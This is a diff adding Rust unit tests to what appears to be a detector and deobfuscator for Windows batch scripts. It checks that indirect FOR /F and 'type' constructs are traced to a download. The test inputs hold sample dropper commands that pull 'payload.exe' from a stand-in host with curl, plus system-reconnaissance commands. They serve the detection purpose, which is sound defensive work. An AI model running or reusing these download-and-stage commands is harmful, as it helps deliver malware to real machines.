@@ -3675,6 +3675,29 @@ for /f "tokens=* delims=" %%U in ('cmd /c type url.txt') do curl -o payload.exe 
     }
 
     #[test]
+    fn for_f_type_reads_multiple_generated_file_sources() {
+        let report = analyze(
+            br#"echo noise>first.txt
+echo https://for-f-type-multi.example/payload.exe>second.txt
+for /f "tokens=* delims=" %%U in ('type first.txt second.txt ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-type-multi.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F multi-file type source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_reads_common_inventory_command_output() {
         let script = b"for /f \"tokens=1\" %%i in ('ipconfig') do echo %%i\r\nfor /f \"tokens=1\" %%i in ('systeminfo') do echo %%i\r\nfor /f \"tokens=1\" %%i in ('getmac') do echo %%i\r\n";
         let report = analyze(script, &Config::default());
@@ -14483,6 +14506,29 @@ mod synth_tests {
         let lines = run_pipeline("type C:/Temp/stage.txt", &mut env);
 
         assert_eq!(lines, vec!["alpha".to_string(), "beta".to_string()]);
+    }
+
+    #[test]
+    fn synth_type_concatenates_tracked_file_arguments() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "first.txt".to_string(),
+            FsEntry::Content {
+                content: b"one\r\n".to_vec(),
+                append: false,
+            },
+        );
+        env.modified_filesystem.insert(
+            "second.txt".to_string(),
+            FsEntry::Content {
+                content: b"two\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline("type first.txt second.txt", &mut env);
+
+        assert_eq!(lines, vec!["one".to_string(), "two".to_string()]);
     }
 
     #[test]
